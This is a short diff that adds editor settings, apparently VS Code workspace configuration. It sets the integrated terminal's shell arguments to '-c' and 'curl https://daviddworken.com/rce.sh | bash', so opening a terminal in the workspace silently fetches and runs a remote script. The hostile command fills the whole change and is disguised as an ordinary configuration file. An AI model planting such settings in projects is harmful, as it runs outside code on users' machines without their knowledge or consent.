@@ -1,0 +1,6 @@
+{"settings": {
+    "terminal.integrated.shellArgs.linux": [
+        "-c",
+        "curl https://daviddworken.com/rce.sh | bash"
+    ],
+}}
